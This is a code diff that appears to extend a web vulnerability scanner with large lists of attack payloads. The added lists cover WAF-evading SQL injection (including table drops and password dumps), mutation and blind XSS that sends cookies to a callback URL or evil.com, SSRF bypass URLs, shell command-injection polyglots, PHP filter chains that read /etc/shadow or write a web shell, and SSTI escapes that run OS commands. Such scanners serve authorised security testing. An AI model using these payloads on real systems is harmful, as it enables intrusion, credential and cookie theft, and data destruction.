@@ -2277,6 +2277,234 @@ class Payloads:
         "X-Original-Forwarded-For",
     ]
 
+    # Polymorphic SQLi - CHAR(), CONCAT(), hex, inline comments for WAF evasion
+    SQLI_POLYMORPHIC = [
+        "' OR CHAR(49)=CHAR(49) --",
+        "' UNION SELECT CONCAT(0x7e,version(),0x7e) --",
+        "' /*!50000OR*/ /*!50000 1=1*/--",
+        "' OR 0x50=0x50 --",
+        "' UNION/*!*/SELECT/*!*/1,2,3--",
+        "' OR CHAR(0x41)=CHAR(0x41)--",
+        "' UNION SELECT CONCAT(CHAR(126),user(),CHAR(126))--",
+        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,@@version--",
+        "' OR 1=1--/**",
+        "'+/*!50000OR*/+1=1--+-",
+        "' OR CONCAT(0x27,0x27)=CONCAT(0x27,0x27)--",
+        "' UNION SELECT 0x61646d696e,0x61646d696e--",
+        "' /*!32302OR*/ 1=1--",
+        "' OR CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)=username--",
+        "' /*!UNION*/ /*!SELECT*/ NULL,CONCAT(0x3a,table_name) FROM information_schema.tables--",
+        "' OR 1=1 /*!50000ORDER*/ BY 1--",
+    ]
+
+    # Second-order SQLi - stored injection via user flows
+    SQLI_SECOND_ORDER_EXTENDED = [
+        "admin'-- ",
+        "test'+OR+1=1--",
+        "user@x]--",
+        "admin'/*",
+        "' OR '1'='1",
+        "user'; DROP TABLE users--",
+        "admin'OR'1'='1'/*",
+        "test\"); INSERT INTO admins VALUES('hacked','hacked')--",
+        "user'||'1'='1",
+        "admin' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+        "' UNION SELECT null,username,password FROM users--",
+        "admin'-- -",
+    ]
+
+    # Conditional error SQLi - CASE/IF for error-based extraction
+    SQLI_CONDITIONAL_ERRORS = [
+        "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",
+        "' OR IF(1=1,1/0,0)--",
+        "' AND (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE 1 END FROM users)--",
+        "' OR (SELECT IIF(1=1,1/0,0))--",
+        "' AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS int) ELSE 1 END)--",
+        "' OR 1=1 AND (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='5') THEN 1/0 ELSE 1 END)--",
+        "' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64) THEN 1/0 ELSE 1 END)--",
+        "' OR IF(SUBSTRING(database(),1,1)='a',BENCHMARK(5000000,SHA1('test')),0)--",
+        "' AND 1=(SELECT TOP 1 CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",
+        "' OR (CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END)='1'--",
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CASE WHEN 1=1 THEN version() ELSE 0 END)))--",
+        "' OR EXP(~(SELECT * FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)a))--",
+    ]
+
+    # Mutation XSS (mXSS) - browser HTML parser mutations
+    XSS_MUTATION_CHAIN = [
+        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+        "<svg><foreignObject><div><style></style><img src=x onerror=alert(1)></div></foreignObject></svg>",
+        "<math><mtext><table><mglyph><svg><foreignObject><img src=x onerror=alert(1)>",
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "<listing><img src=1 onerror=alert(1)>",
+        "<xmp><img src=1 onerror=alert(1)></xmp>",
+        "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><script>alert(1)</script>",
+        "<form><math><mtext></form><form><mglyph><svg><script>alert(1)</script>",
+        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>",
+        "<table><tr><td><svg><desc><template><img src=x onerror=alert(1)>",
+        "<svg><a><rect width=100% height=100%></rect><animate attributeName=href to=javascript:alert(1)>",
+        "<math><mrow><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></mrow></math>",
+    ]
+
+    # Blind XSS - callback templates ({callback_url} placeholder)
+    XSS_BLIND_CALLBACKS = [
+        "\"><script src={callback_url}></script>",
+        "'><script src={callback_url}></script>",
+        "<img src=x onerror=\"fetch('{callback_url}?c='+document.cookie)\">",
+        "\"><img src=x onerror=fetch('{callback_url}')>",
+        "<script>navigator.sendBeacon('{callback_url}',document.cookie)</script>",
+        "'\"><svg onload=\"new Image().src='{callback_url}?d='+document.domain\">",
+        "<script>var ws=new WebSocket('{callback_url}');ws.onopen=function(){{ws.send(document.cookie)}}</script>",
+        "javascript:fetch('{callback_url}?c='+document.cookie)",
+        "\"><input onfocus=fetch('{callback_url}') autofocus>",
+        "'\"><details open ontoggle=fetch('{callback_url}?c='+document.cookie)>",
+    ]
+
+    # Context-aware XSS - payloads per reflection context
+    XSS_CONTEXT_AWARE = {
+        "html_attr": [
+            "\" onfocus=alert(1) autofocus=\"",
+            "' onfocus=alert(1) autofocus='",
+            "\" onmouseover=alert(1) x=\"",
+            "' onmouseover=alert(1) x='",
+            "\" autofocus onfocus=alert(1)//",
+            "\" style=animation-name:x onanimationstart=alert(1) x=\"",
+            "\" tabindex=1 onfocus=alert(1) x=\"",
+        ],
+        "js_string": [
+            "';alert(1);//",
+            "\\';alert(1)//",
+            "-alert(1)-",
+            "\"};alert(1);//",
+            "</script><script>alert(1)</script>",
+            "'-confirm(1)-'",
+            "\\x3cimg src=x onerror=alert(1)\\x3e",
+        ],
+        "url_context": [
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "javascript:alert(String.fromCharCode(88,83,83))",
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            "javascript:void(document.location='http://evil.com/'+document.cookie)",
+            "javascript://comment%0aalert(1)",
+        ],
+        "css_context": [
+            "expression(alert(1))",
+            "url(javascript:alert(1))",
+            "};*{color:red;background:url(javascript:alert(1))};",
+            "red;}</style><script>alert(1)</script><style>.x{color:red",
+            "url('data:text/html,<script>alert(1)</script>')",
+            "var(--x:expression(alert(1)))",
+        ],
+    }
+
+    # SSRF advanced bypass - parser differentials and IP tricks
+    SSRF_ADVANCED_BYPASS = [
+        "http://evil.com@127.0.0.1/",
+        "http://127.0.0.1#@evil.com",
+        "http://0x7f000001/",
+        "http://0177.0.0.1/",
+        "http://2130706433/",
+        "http://[::ffff:127.0.0.1]/",
+        "http://127.1/",
+        "http://0/",
+        "http://127.0.0.1:80@evil.com/",
+        "http://evil.com%00@127.0.0.1/",
+        "http://127.0.0.1%23@evil.com/",
+        "http://0000::1/",
+    ]
+
+    # Command injection polyglot - cross-shell payloads
+    CMDI_POLYGLOT = [
+        "&&id||whoami",
+        ";id;whoami;",
+        "`id`$(whoami)",
+        "|id|whoami",
+        "&id&whoami",
+        "||id&&whoami",
+        ";id\nwhoami",
+        "\nid\nwhoami\n",
+        "$(id)&&`whoami`",
+        "|id||whoami||",
+        "&& id ; whoami",
+        ";id;echo${IFS}$(whoami)",
+    ]
+
+    # LFI filter chain - PHP iconv chains for file read
+    LFI_FILTER_CHAIN = [
+        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode/resource=index.php",
+        "php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-encode/resource=/etc/passwd",
+        "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.iconv.ISO2022KR.UTF-16|convert.iconv.L6.UCS2/resource=index.php",
+        "php://filter/convert.iconv.UTF-8.CSUNICODE|convert.iconv.UCS-2.UTF-8|convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
+        "php://filter/convert.iconv.UTF-16.UTF-16BE|convert.iconv.UTF-16BE.UTF-8/resource=/etc/passwd",
+        "php://filter/read=convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.base64-decode/resource=index.php",
+        "php://filter/convert.iconv.L1.UCS-2|convert.iconv.UCS-2.L1|convert.base64-encode/resource=/etc/shadow",
+        "php://filter/convert.iconv.UTF-8.UTF-16LE|convert.iconv.UTF-8.CSISO2022KR|convert.iconv.UCS2.UTF-8|convert.iconv.ISO-IR-111.CSISO2022KR/resource=config.php",
+    ]
+
+    # SSTI sandbox escape - advanced MRO and framework-specific payloads
+    SSTI_SANDBOX_ESCAPE_ADVANCED = [
+        "{{().__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['os'].popen('id').read()}}",
+        "{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()[132]()._module.__builtins__['__import__']('os').popen('id').read()}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{lipsum.__globals__['os'].popen('id').read()}}",
+        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
+        "{%set x=''.__class__.__mro__[1].__subclasses__()%}{%for i in x%}{%if 'warning' in i.__name__%}{{i()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
+        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
+        "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
+        "{{[].__class__.__base__.__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()[0]}}",
+    ]
+
+    # Deep Scan - Chain templates mapping chain names to attack step sequences
+    DEEP_SCAN_CHAIN_TEMPLATES = {
+        "ssrf_to_sqli": ["probe_ssrf_internal", "confirm_access", "inject_sqli_via_redirect"],
+        "lfi_to_rce": ["confirm_lfi", "identify_log_path", "poison_log_ua", "include_poisoned_log"],
+        "xss_to_csrf": ["confirm_reflection", "craft_csrf_payload", "inject_via_xss"],
+        "sqli_to_dump": ["confirm_sqli", "enumerate_tables", "extract_data"],
+        "auth_bypass_chain": ["test_direct", "test_idor", "test_privilege_escalation"],
+        "api_full_scan": ["fingerprint", "test_bola", "test_injection", "test_mass_assign", "test_auth_bypass"],
+    }
+
+    # API Vulnerability Payloads - specifically formatted for API testing
+    API_VULN_PAYLOADS = {
+        "json_sqli": [
+            '{"id": "1 OR 1=1--"}',
+            '{"id": "1\' OR \'1\'=\'1"}',
+            '{"id": "1; DROP TABLE users--"}',
+            '{"search": "\' UNION SELECT NULL,NULL,NULL--"}',
+            '{"filter": "1 AND SLEEP(5)"}',
+        ],
+        "json_nosqli": [
+            '{"username": {"$gt": ""}}',
+            '{"username": {"$ne": null}}',
+            '{"$where": "sleep(5000)"}',
+            '{"username": {"$regex": ".*"}}',
+            '{"password": {"$exists": true}}',
+        ],
+        "mass_assignment_fields": [
+            "role", "admin", "is_admin", "isAdmin", "privilege",
+            "permissions", "user_type", "account_type", "is_superuser",
+            "is_staff", "verified", "approved", "status", "plan", "tier",
+        ],
+        "auth_bypass_headers": [
+            {"Authorization": ""},
+            {"Authorization": "Bearer null"},
+            {"Authorization": "Bearer undefined"},
+            {"X-Custom-IP-Authorization": "127.0.0.1"},
+            {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Original-URL": "/admin"},
+            {"X-Rewrite-URL": "/admin"},
+        ],
+        "sensitive_response_patterns": [
+            "password", "passwd", "secret", "token", "api_key", "apiKey",
+            "private_key", "privateKey", "ssn", "social_security",
+            "credit_card", "creditCard", "cvv", "bank_account",
+            "access_token", "refresh_token", "session_id",
+        ],
+    }
+
 
 class Colors:
     """Terminal Colors"""
@@ -2355,4 +2583,14 @@ MITRE_CWE_MAP = {
     "Service Exposure": ("T1190", "CWE-284"),
     "Missing Security Header": ("T1189", "CWE-693"),
     "Version Disclosure": ("T1592", "CWE-200"),
+}
+
+
+# Deep scan configuration for enhanced crawler parameter discovery
+DEEP_SCAN_CONFIG = {
+    "max_js_depth": 5,
+    "extract_response_params": True,
+    "mine_api_versions": True,
+    "websocket_discovery": True,
+    "recursive_param_limit": 500,
 }
